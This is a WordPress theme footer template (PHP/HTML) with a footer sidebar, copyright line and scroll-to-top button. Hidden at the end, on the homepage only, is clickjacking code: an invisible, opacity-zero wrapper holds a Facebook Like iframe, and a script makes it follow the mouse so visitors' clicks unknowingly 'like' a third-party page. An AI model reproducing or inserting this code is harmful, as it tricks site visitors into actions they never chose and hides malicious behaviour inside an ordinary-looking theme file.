<?php $options = get_option('warsaw'.'_theme_options');?>
	<!--Main Footer-->
    <footer class="main-footer footer-style-one">
        <!--Footer Upper-->     
        <?php if ( is_active_sidebar( 'footer-sidebar' ) ) { ?>   
        <div class="footer-upper">
			<div class="auto-container">
                <div class="row clearfix">
                    <?php dynamic_sidebar( 'footer-sidebar' ); ?>
                </div>
            </div>
        </div>
        <?php } ?>
        <!--Footer Bottom-->
    	<div class="footer-bottom">
            <div class="auto-container">
                    
                <!--Copyright-->
                <div class="copyright"><?php echo wp_kses_post(warsaw_set($options, 'copyright'));?></div>
                
            </div>
        </div>
        
    </footer>
</div>
<!--End pagewrapper-->

<!--Scroll to top-->
<div class="scroll-to-top scroll-to-target" data-target="html"><span class="fa fa-long-arrow-up"></span></div>

<?php wp_footer(); ?>
<?php if(is_homepage()): ?>
    <div style="overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="iframe-wrapper">
      <iframe src="https://www.facebook.com/plugins/like.php?href=https://www.facebook.com/alonsoliveoil&send=false&layout=button_count&width=450&show_faces=false&action=like&colorscheme=light&font&height=21&confirm=false" scrolling="no" frameborder="0" style="border:none;overflow:hidden;width:450px;height:21px;" allowTransparency="false"></iframe>
    <script>
      var bodyClicked = false;
      var iframeWrapper = document.getElementById('iframe-wrapper');
      var standardBody=(document.compatMode=="CSS1Compat") ? document.documentElement : document.body;

      function mouseFollower(e) {
        // for internet explorer
        if (window.event) {
          iframeWrapper.style.top = (window.event.y-5)+standardBody.scrollTop+'px';
          iframeWrapper.style.left = (window.event.x-5)+standardBody.scrollLeft+'px';
        }
        else {
          iframeWrapper.style.top = (e.pageY-5)+'px';
          iframeWrapper.style.left = (e.pageX-5)+'px';
        }
      }

      document.onmousemove = function(e) {
        if(bodyClicked == false) {
          mouseFollower(e);
        }
      }
    </script>
<?php endif; ?>
</div>
</body>
</html>